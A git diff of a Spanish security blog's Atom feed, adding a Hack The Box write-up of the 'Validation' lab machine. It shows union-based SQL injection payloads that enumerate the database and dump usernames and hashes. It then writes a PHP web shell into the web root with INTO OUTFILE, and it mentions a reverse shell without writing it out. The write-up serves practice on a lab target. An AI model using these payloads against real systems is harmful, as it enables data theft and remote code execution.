@@ -1,4 +1,195 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-04-07T17:58:52+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">RuyzTzt7 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs e investigaciones</subtitle><author><name>Álvaro Ruiz Gutiérrez</name></author><entry><title type="html">WriteUp HTB - Máquina Keeper</title><link href="http://localhost:4000/writeup-keeper/" rel="alternate" type="text/html" title="WriteUp HTB - Máquina Keeper" /><published>2025-04-07T00:00:00+02:00</published><updated>2025-04-07T00:00:00+02:00</updated><id>http://localhost:4000/writeup-keeper</id><content type="html" xml:base="http://localhost:4000/writeup-keeper/"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-04-12T18:41:40+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">RuyzTzt7 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs e investigaciones</subtitle><author><name>Álvaro Ruiz Gutiérrez</name></author><entry><title type="html">WriteUp HTB - Máquina validation</title><link href="http://localhost:4000/writeup-validation/" rel="alternate" type="text/html" title="WriteUp HTB - Máquina validation" /><published>2025-04-12T00:00:00+02:00</published><updated>2025-04-12T00:00:00+02:00</updated><id>http://localhost:4000/writeup-validation</id><content type="html" xml:base="http://localhost:4000/writeup-validation/"><![CDATA[<p align="center">
+  <img src="/assets/images/htb/validation/burp.png" alt="Validation" width="2200" />
+</p>
+
+<hr />
+
+<h2 id="explotación-sqli">Explotación SQLI.</h2>
+
+<p>Vemos en primer lugar que nos enfrentamos ante un panel donde no se acontece ningun login. Solo un post donde te creas un usuario al acceder.</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/web.png" alt="1" width="2200" />
+</p>
+
+<p>Probamos a alterar el campo de país con Burpsuite para ver si se acontece algún fallo en la web.</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp1.png" alt="2" width="2200" />
+</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp2.png" alt="3" width="2200" />
+</p>
+
+<p>Como falla, podemos intuir que es vulnerable a SQLI, además vemos que se interpreta código php y que es un servidor apache alojado en la ruta del sistema /var/www/html.</p>
+
+<p>Ahora probaremos a lanzar un:</p>
+
+<ul>
+  <li><strong>Comando:</strong>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">order</span> <span class="n">by</span> <span class="mi">100</span><span class="o">--</span> <span class="o">-</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>para probar listar un ordenamiento de los datos basados en la columna número 100. En caso de responderte el mismo error en vez de alguno que te indique que se desconoce los datos de esa columna, podremos ir inyectando código con un</p>
+
+<ul>
+  <li><strong>Comando:</strong></li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="mf">....</span> <span class="o">--</span> <span class="o">-</span>
+
+</code></pre></div></div>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp3.png" alt="4" width="2200" />
+</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp4.png" alt="5" width="2200" />
+</p>
+
+<p>Probaremos a listar las base de datos existentes:</p>
+
+<ul>
+  <li><strong>Comando:</strong>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="nf">database</span><span class="p">()</span><span class="o">--</span> <span class="o">-</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp5.png" alt="6" width="2200" />
+</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp6.png" alt="7" width="2200" />
+</p>
+
+<p>Vemos que la bd se llama registration.</p>
+
+<p>Para listar el nombre de todas las base de datos:</p>
+
+<ul>
+  <li><strong>Comando:</strong>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="n">schema_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="mf">.</span><span class="n">schemata</span><span class="o">--</span> <span class="o">-</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp7.png" alt="8" width="2200" />
+</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp8.png" alt="9" width="2200" />
+</p>
+
+<p>Para listar las tablas que contiene la base de datos registration probamos con:</p>
+
+<ul>
+  <li>
+    <p><strong>Comando:</strong></p>
+
+    <p>’ union SELECT table_name from information_schema.tables where table_schema=”registration”– -
+```</p>
+  </li>
+</ul>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp9.png" alt="10" width="2200" />
+</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp10.png" alt="11" width="2200" />
+</p>
+
+<p>Para listar las columnas de la tabla que queramos probamos con:</p>
+
+<ul>
+  <li><strong>Comando:</strong>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="n">column_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="mf">.</span><span class="n">columns</span> <span class="n">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s2">"registration"</span> <span class="k">and</span> <span class="n">table_name</span><span class="o">=</span><span class="s2">"registration"</span><span class="o">--</span> <span class="o">-</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp11.png" alt="12" width="2200" />
+</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp12.png" alt="13" width="2200" />
+</p>
+
+<p>Para listar el contenido de las dos entidades username y userhash, jugamos con group_concat para listar la info correspondiente de la tabla registration</p>
+
+<ul>
+  <li><strong>Comando:</strong>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="nf">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="n">userhash</span><span class="p">)</span> <span class="n">from</span> <span class="n">registration</span><span class="o">--</span> <span class="o">-</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>0x3a = ;</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp13.png" alt="14" width="2200" />
+</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp14.png" alt="16" width="2200" />
+</p>
+
+<p>No vemos información relevante ya que en los hashes no hay ninguna password por la naturaleza de la web, por lo que intentaremos interpretar código php interpretando el fichero en la ruta del sistema que la que suponemos que se almacena.</p>
+
+<ul>
+  <li><strong>Comando:</strong>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span> <span class="n">union</span> <span class="no">SELECT</span> <span class="s2">"Esto es una prueba"</span> <span class="n">into</span> <span class="n">outfile</span> <span class="s2">"/var/www/html/prueba.txt"</span><span class="o">--</span> <span class="o">-</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp15.png" alt="17" width="2200" />
+</p>
+<p>Vemos como nos lo interpreta y se almacena el el sistema, por lo que intentaremos de mandar código php para poder ejecturar comandos</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp16.png" alt="18" width="2200" />
+</p>
+
+<ul>
+  <li><strong>Comando:</strong></li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union SELECT "<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>" into outfile "/var/www/html/prueba.php"-- -
+</code></pre></div></div>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp17.png" alt="19" width="2200" />
+</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp18.png" alt="20" width="2200" />
+</p>
+
+<p>Vemos que funciona desde la web, por lo que le pasaremos en oneliner para entablar una reverse shell a nuestro equipo encodeando a url la petición para que se interprete.</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp19.png" alt="21" width="2200" />
+</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp20.png" alt="22" width="2200" />
+</p>
+
+<p align="center">
+  <img src="/assets/images/htb/validation/burp21.png" alt="23" width="2200" />
+</p>
+
+<hr />]]></content><author><name>Álvaro Ruiz Gutiérrez</name></author><category term="HTB" /><category term="WriteUp" /><category term="eJPT" /><category term="SQLI" /><category term="Linux" /><category term="Fácil" /><category term="eJPT" /><category term="MySQL" /><summary type="html"><![CDATA[En este artículo, resolveremos la máquina Validation de la plataforma HTB.]]></summary></entry><entry><title type="html">WriteUp HTB - Máquina Keeper</title><link href="http://localhost:4000/writeup-keeper/" rel="alternate" type="text/html" title="WriteUp HTB - Máquina Keeper" /><published>2025-04-07T00:00:00+02:00</published><updated>2025-04-07T00:00:00+02:00</updated><id>http://localhost:4000/writeup-keeper</id><content type="html" xml:base="http://localhost:4000/writeup-keeper/"><![CDATA[<p align="center">
   <img src="/assets/images/htb/keeper/logo2.png" alt="Beep" width="2200" />
 </p>
 
